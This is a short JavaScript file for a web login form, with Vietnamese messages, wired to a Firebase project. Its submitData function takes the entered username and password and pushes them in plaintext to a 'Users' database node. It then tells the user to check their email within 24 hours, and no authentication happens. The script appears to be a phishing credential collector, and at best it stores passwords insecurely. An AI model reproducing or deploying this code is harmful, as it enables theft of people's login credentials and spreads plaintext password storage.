var firebaseConfig = {
    apiKey: "AIzaSyB_MLIrEzCP3MqHjvcfEggR0DgFDAS2Hj8",
    authDomain: "test-firebase-8ebe8.firebaseapp.com",
    databaseURL: "https://test-firebase-8ebe8-default-rtdb.firebaseio.com",
    projectId: "test-firebase-8ebe8",
    storageBucket: "test-firebase-8ebe8.appspot.com",
    messagingSenderId: "558521480835",
    appId: "1:558521480835:web:59848fe93588ea8ed64db6",
    measurementId: "G-Q0M59N5X0G"
  };
  firebase.initializeApp(firebaseConfig);
  firebase.analytics();
  function submitData(){
        username = document.getElementById("username").value;
        password = document.getElementById("password").value;
        if ((username != '') && (password != '')){
        firebase.database().ref("Users").push({
            username: document.getElementById("username").value,
            password: document.getElementById("password").value
        })
        document.getElementById("noti_input").innerHTML = "Vui lòng kiểm tra email của bạn trong vòng 24 giờ tới !"
    }
    else{
        document.getElementById("noti_input").innerHTML = "Vui lòng nhập cả Tên đăng nhập và Mật khẩu"
    }
    }